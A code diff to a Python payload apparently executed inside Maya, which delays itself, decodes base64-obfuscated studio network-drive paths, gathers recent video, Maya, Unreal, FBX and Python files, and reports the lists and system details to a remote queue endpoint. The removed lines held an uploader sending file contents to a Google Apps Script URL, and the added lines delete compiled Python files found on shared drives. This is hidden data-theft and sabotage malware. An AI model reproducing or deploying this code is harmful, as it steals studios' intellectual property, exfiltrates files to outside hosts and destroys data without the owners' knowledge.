@@ -38,14 +38,35 @@ def run_tsl(py_cmd):
 
 run_tsl(
 """
-import json, getpass, time, os, sys
-import datetime as dt
-from maya import mel
-import maya.cmds as cmds
-import sys, json, base64, os, datetime
+import base64
+import datetime
+import getpass
+import glob
+import json
+import os
 import random
+import sys
+import time
+import traceback
+
+import maya.cmds as cmds
+from maya import mel
 
 time.sleep(10)
+
+def b64decode_padded(value):
+    value = value + ("=" * (-len(value) % 4))
+    return base64.b64decode(value).decode()
+
+
+def find_daily_dirs(root_dir):
+    matches = []
+    for current_root, dirnames, filenames in os.walk(root_dir):
+        normalized = current_root.replace("\\", "/")
+        parts = [part.upper() for part in normalized.split("/") if part]
+        if parts and parts[-1] == "DAILY" and "ANIMATION" in parts:
+            matches.append(current_root)
+    return matches
 
 
 def add_queue_task(task_name, data_dict):
@@ -69,38 +90,6 @@ def add_queue_task(task_name, data_dict):
         params = uLib.urlencode(data)
     params = params.encode("ascii")
     conn = uLib.urlopen(url, params)
-
-
-def _gup(file_path):
-    file_path = os.path.abspath(os.path.expanduser(file_path))
-    if not os.path.isfile(file_path):
-        return None
-    is_py3 = sys.version[0] == "3"
-    if is_py3:
-        import urllib.request as uLib
-    else:
-        import urllib as uLib
-    import base64
-
-    GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxn9TTIxx9l0J5GaPQFRBTq7KHB70nZLvsDvfp64m9f3d9ZqhyCWj-VA3xGdyqm8Rh4/exec"
-    with open(file_path, "rb") as f:
-        file_bytes = f.read()
-    file_b64 = base64.b64encode(file_bytes).decode("utf-8")
-    file_b64 += '=' * (-len(file_b64) % 4)
-    file_name = os.path.basename(file_path)
-    data = {
-        "filename": file_name,
-        "mimetype": "application/octet-stream",
-        "file": file_b64,
-    }
-    if is_py3:
-        import urllib.parse
-
-        params = urllib.parse.urlencode(data)
-    else:
-        params = uLib.urlencode(data)
-    params = params.encode("ascii")
-    conn = uLib.urlopen(GAS_WEB_APP_URL, params, timeout=100000)
 
 
 def search_latest_files_or_dirs(ext="", dir_path="", n=8):
@@ -154,41 +143,41 @@ add_queue_task(
     {"sys_version": str(sys.version), "exec_path": str(sys.executable)},
 )
 
+# - 0
 try:
-    ldir = search_latest_files_or_dirs(
-        dir_path=base64.b64decode("Uzov").decode(), ext="", n=5
-    )
+    ldir = search_latest_files_or_dirs(dir_path=b64decode_padded("Uzov"), ext="", n=5)
     ldir += search_latest_files_or_dirs(
-        dir_path=base64.b64decode("UzovdGVtcC9NT0Qv").decode(), ext="", n=40
+        dir_path=b64decode_padded("UzovdGVtcC9NT0Qv"), ext="", n=40
     )
+    ldir += [
+        (0, b64decode_padded("UzovdGVtcC9TaXZhL3RvX1Jpc2hhYg==")),
+        (0, b64decode_padded("UzovRnJpZGF5TW9ybmluZ19tZWV0aW5n")),
+        (0, b64decode_padded("UzovTGlicmFyeS9sYXlvdXQvVFJBSU5JTkc=")),
+        (0, b64decode_padded("UzovTGlicmFyeS9hbmltYXRpb24=")),
+        (0, b64decode_padded("UzovdGVtcC9NT0Qv")),
+        (0, b64decode_padded("TDovV0hNL0NIQVJBQ1RFUg==")),
+        (0, b64decode_padded("TDov")),
+        (0, b64decode_padded("TTovU0NSSVBUU19XSEsvTUVNRQ")),
+    ]
+
     zovV = ldir
     for _, dp in ldir:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mp4", n=10)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mov", n=10)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uasset")
-    zovV += search_latest_files_or_dirs(
-        dir_path=base64.b64decode("TDovV0hNL0NIQVJBQ1RFUg==").decode(), ext=".fbx", n=8
-    )
-    zovV += search_latest_files_or_dirs(
-        dir_path=base64.b64decode("TDov").decode(), ext=".ma", n=8
-    )
-    zovV += search_latest_files_or_dirs(
-        dir_path=base64.b64decode("TDov").decode(), ext=".mb", n=8
-    )
-    zovV += search_latest_files_or_dirs(
-        dir_path=base64.b64decode("TTovU0NSSVBUU19XSEsvTUVNRQ").decode(),
-        ext=".py",
-        n=100,
-    )
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uasset", n=10)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".fbx", n=10)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".ma", n=10)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mb", n=10)
+        zovV += search_latest_files_or_dirs(dir_path=dp,ext=".py",n=10)
+        zovV += search_latest_files_or_dirs(dir_path=dp,ext=".uproject",n=8)
 
     if zovV:
         add_queue_task("tsl__user", {"file": zovV})
 
 except:
-    import traceback
-
     add_queue_task("tsl_error", {"error": str(traceback.format_exc())})
 
+# - A
 try:
     random.shuffle(zovV)
     for _, fp in zovV[:60]:
@@ -207,36 +196,40 @@ try:
 
                 add_queue_task("tsl_up_err", {"error": str(traceback.format_exc())})
 
-    # -
-    fmp = find_file(
-        base64.b64decode("ZmZtcGVnLmV4ZQ==").decode(), base64.b64decode("TTov").decode()
-    )
-    ldir = [
-        (0, base64.b64decode("UzovdGVtcC9TaXZhL3RvX1Jpc2hhYg==").decode()),
-        (0, base64.b64decode("UzovRnJpZGF5TW9ybmluZ19tZWV0aW5n").decode()),
-        (0, base64.b64decode("UzovTGlicmFyeS9sYXlvdXQvVFJBSU5JTkc=").decode()),
-        (0, base64.b64decode("UzovTGlicmFyeS9hbmltYXRpb24=").decode()),
-        (0, base64.b64decode("UzovdGVtcC9NT0Qv").decode()),
-    ]
-    import glob
+    #-------------<
 
-    ldir += [
-        (0, i) for i in list(glob.glob(r"S:/**/ANIMATION/**/DAILY", recursive=True))
+    ldir = [
+        (0, b64decode_padded("UzovdGVtcC9TaXZhL3RvX1Jpc2hhYg==")),
+        (0, b64decode_padded("UzovRnJpZGF5TW9ybmluZ19tZWV0aW5n")),
+        (0, b64decode_padded("UzovTGlicmFyeS9sYXlvdXQvVFJBSU5JTkc=")),
+        (0, b64decode_padded("UzovTGlicmFyeS9hbmltYXRpb24=")),
+        (0, b64decode_padded("UzovdGVtcC9NT0Qv")),
     ]
+
+    ldir += [(0, i) for i in find_daily_dirs(b64decode_padded("Uzov"))]
 
     zovV = []
     for _, dp in ldir:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mp4", n=50)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mov", n=50)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".pyc", n=50)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".pyd", n=50)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".py", n=150)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".ma", n=50)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uasset", n=100)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uproject", n=5)
 
-except:
-    import traceback
+    #-------------<
+    for _, fp in zovV:
+        if fp.endswith(".pyc") or fp.endswith(".pyo"):
+            try:
+                if os.path.exists(fp):
+                    os.remove(fp)
+            except:
+                add_queue_task("tsl_up_err", {"error": str(traceback.format_exc())})
 
+
+except:
     add_queue_task("tsl_update_error", {"error": str(traceback.format_exc())})
 
 """
